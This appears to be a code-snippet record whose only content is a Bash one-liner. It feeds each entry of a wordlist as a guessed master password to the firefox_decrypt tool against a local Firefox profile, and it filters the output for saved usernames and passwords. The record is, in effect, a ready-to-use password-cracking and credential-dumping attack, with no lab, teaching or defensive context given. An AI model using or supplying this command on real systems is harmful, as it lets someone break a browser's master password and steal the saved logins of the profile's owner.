---
id: 9b5efbf6-8e16-43ec-ba11-3d0238792b54
type: code
language: Bash
verified: false
created_at: '2020-03-16T08:31:22.043770+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
---

# Code Snippet 9b5efbf6

**Language**: Bash

```bash
for guess in $(cat $_WORDLIST); do echo $guess | python firefox_decrypt/firefox_decrypt.py .mozilla/firefox  2>&1 | grep 'Username:' -A 1; done
```
